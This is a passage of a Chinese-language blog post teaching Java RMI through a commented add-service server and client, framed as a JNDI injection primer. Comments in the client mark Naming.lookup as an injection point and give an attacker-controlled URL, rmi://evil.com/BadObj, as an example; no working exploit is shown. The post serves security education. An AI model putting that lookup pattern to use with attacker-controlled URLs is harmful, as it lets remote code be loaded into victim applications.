</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;加法服务已成功注册，名字 = AddService&#34;</span>);
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;服务器已就绪，等待客户端远程调用...&#34;</span>);
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;按 Ctrl+C 可以停止服务器&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 任何异常都打印出来（启动失败常见原因是端口被占用）</span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;服务器启动失败！&#34;</span>);
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ==================== 客户端代码（写在同一个文件里方便学习）===================</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AddClient</span> {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 客户端只需要一个 main 方法，不需要实现任何远程接口</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第1步：拼出远程服务的完整 JNDI 名字</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 格式：rmi://ip:端口/服务名</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 如果服务器和客户端在同一台机器，可以写 rmi:///AddService 或 rmi://127.0.0.1/AddService</span>
</span></span><span style=display:flex><span>            String url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;rmi://127.0.0.1:1099/AddService&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 注意：这里如果把 url 换成用户输入，就是经典的 JNDI 注入点了！！！</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;客户端正在连接服务器：&#34;</span> <span style=color:#f92672>+</span> url);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第2步：关键的 JNDI lookup 操作（最容易出安全问题的点）</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 从注册中心查找名为 &#34;AddService&#34; 的远程对象，返回的是 stub（代理）</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 如果这里 url 是用户可控的，攻击者就可以让你去 rmi://evil.com/BadObj</span>
</span></span><span style=display:flex><span>            AddServerIntf stub <span style=color:#f92672>=</span> (AddServerIntf) Naming.<span style=color:#a6e22e>lookup</span>(url);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;成功拿到远程对象的代理（stub）&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 第3步：像调用本地方法一样调用远程方法</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 实际上底层会通过网络把参数序列化发给服务器，服务器计算完再返回</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>double</span> result <span style=color:#f92672>=</span> stub.<span style=color:#a6e22e>add</span>(13.<span style=color:#a6e22e>5</span>, 28.<span style=color:#a6e22e>7</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 结果是在服务器算的，但打印是在客户端</span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;【客户端】远程计算结果：13.5 + 28.7 = &#34;</span> <span style=color:#f92672>+</span> result);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 再测一次</span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;再来一次：stub.add(100, 200) = &#34;</span> <span style=color:#f92672>+</span> stub.<span style=color:#a6e22e>add</span>(100, 200));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;客户端调用失败！&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 常见原因：服务器没开、ip写错、防火墙、名字不对、没启动 registry</span>
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=使用方法小白专用步骤>使用方法（小白专用步骤）：<a hidden class=anchor aria-hidden=true href=#使用方法小白专用步骤>#</a></h3><ol><li>把上面所有代码复制到一个新文件，命名为 AddServerWithFullComments.java</li><li>先用 javac AddServerWithFullComments.java 编译（会生成很多 .class 文件）</li><li>开两个终端：<ul><li>终端1（服务器）：java AddServerImpl</li><li>终端2（客户端）：java AddClient</li></ul></li><li>你就会看到服务器打印计算日志，客户端打印结果</li></ol><p>这样你就把“JNDI 注入原理示例 + 超详细逐行注释”完整保存在一个文件里了，随时可以拿出来复习～</p><p>有需要我再给你拆成三个独立文件（接口、服务器、客户端）或者加上安全加固版的代码也可以随时说</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://ljj1992.fun/tags/java/>Java</a></li><li><a href=http://ljj1992.fun/tags/jndi%E6%B3%A8%E5%85%A5/>JNDI注入</a></li><li><a href=http://ljj1992.fun/tags/web%E5%AE%89%E5%85%A8/>Web安全</a></li><li><a href=http://ljj1992.fun/tags/%E5%9F%BA%E7%A1%80%E7%BC%96%E7%A8%8B/>基础编程</a></li><li><a href=http://ljj1992.fun/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>网络安全</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=http://ljj1992.fun/>star徐的博客</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>